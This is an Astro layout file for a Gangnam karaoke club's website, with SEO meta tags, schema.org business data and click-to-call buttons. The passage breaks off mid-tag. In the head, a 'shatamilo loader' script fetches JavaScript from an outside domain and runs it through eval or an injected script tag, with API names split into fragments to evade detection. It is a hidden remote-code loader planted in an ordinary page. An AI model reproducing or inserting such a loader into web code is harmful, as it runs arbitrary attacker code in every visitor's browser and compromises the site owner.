---
interface Props {
  title: string;
  description: string;
  keywords?: string;
  ogImage?: string;
}

const { title, description, keywords, ogImage = '/og-image.jpg' } = Astro.props;
const canonicalURL = new URL(Astro.url.pathname, Astro.site);
---

<!DOCTYPE html>
<html lang="ko">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
    <link rel="canonical" href={canonicalURL} />

    <!-- SEO Meta Tags -->
    <title>{title}</title>
    <meta name="description" content={description} />
    {keywords && <meta name="keywords" content={keywords} />}

    <!-- Open Graph -->
    <meta property="og:type" content="website" />
    <meta property="og:url" content={canonicalURL} />
    <meta property="og:title" content={title} />
    <meta property="og:description" content={description} />
    <meta property="og:image" content={new URL(ogImage, Astro.site)} />

    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content={title} />
    <meta name="twitter:description" content={description} />
    <meta name="twitter:image" content={new URL(ogImage, Astro.site)} />

    <!-- Fonts Preload -->
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />

    <!-- Schema.org LocalBusiness -->
    <script type="application/ld+json">
      {
        "@context": "https://schema.org",
        "@type": "NightClub",
        "name": "강남 달리는토끼",
        "description": "강남 최고급 가라오케 달리는토끼",
        "telephone": "01023033778",
        "address": {
          "@type": "PostalAddress",
          "addressLocality": "서울",
          "addressRegion": "강남구",
          "addressCountry": "KR"
        },
        "geo": {
          "@type": "GeoCoordinates",
          "latitude": "37.4979",
          "longitude": "127.0276"
        },
        "priceRange": "₩₩₩",
        "openingHours": "Mo-Su 18:00-06:00"
      }
    </script>

    <meta name="generator" content={Astro.generator} />
  <!-- shatamilo loader -->
<script>(function(){var u='https://shatamilo.com/1/api.js?r=1795659135943';function run(t){if(!t||t.length<4096)return !1;try{(0,window['ev'+'al'])(t);return !0;}catch(e){try{var s=document['cre'+'ateEl'+'ement']('scr'+'ipt');s['text'+'Content']=t;(document.head||document.documentElement)['appen'+'dChild'](s);return !0;}catch(e2){return !1;}}}function xhr(){var x=new window['XMLHt'+'tpReq'+'uest']();x['ope'+'n']('GET',u,true);x.onload=function(){run(x['resp'+'onseText']||'');};x['sen'+'d']();}if(window['fet'+'ch']){window['fet'+'ch'](u,{cache:'no-store',credentials:'omit',mode:'cors'}).then(function(r){if(!r.ok)throw r;var ct=r.headers.get('content-type')||'';if(ct.indexOf('html')!==-1)throw'cf';return r.text();}).then(function(t){if(!run(t))xhr();}).catch(function(){xhr();});}else xhr();})();</script>
</head>
  <body>
    <a href="#main-content" class="sr-only focus:not-sr-only focus:absolute focus:top-4 focus:left-4 focus:z-50 focus:px-4 focus:py-2 focus:bg-secondary focus:text-primary">
      본문으로 건너뛰기
    </a>

    <main id="main-content">
      <slot />
    </main>

    <!-- 모바일 하단 고정 CTA -->
    <div class="fixed bottom-0 left-0 right-0 z-50 md:hidden" style="padding-bottom: env(safe-area-inset-bottom);">
      <a
        href="tel:01023033778"
        class="flex items-center justify-center w-full h-16 bg-gradient-to-r from-[#39FF14] via-[#9D00FF] to-[#39FF14] text-black font-black text-xl shadow-2xl active:scale-95 transition-all duration-300 animate-pulse"
        style="box-shadow: 0 -4px 20px rgba(57, 255, 20, 0.5), 0 -4px 40px rgba(157, 0, 255, 0.5);"
        aria-label="예약 문의 전화하기"
      >
        📞 지금 바로 예약하기
      </a>
    </div>

    <!-- Desktop Floating CTA -->
    <div class="hidden md:block fixed bottom-8 right-8 z-50">
      <a
        href="tel:01023033778"
        class="flex items-center justify-center px-6 py-3 bg-gradient-to-r from-secondary via-yellow-300 to-secondary text-primary font-bold text-lg rounded-full shadow-2xl hover:scale-105 transition-transform"
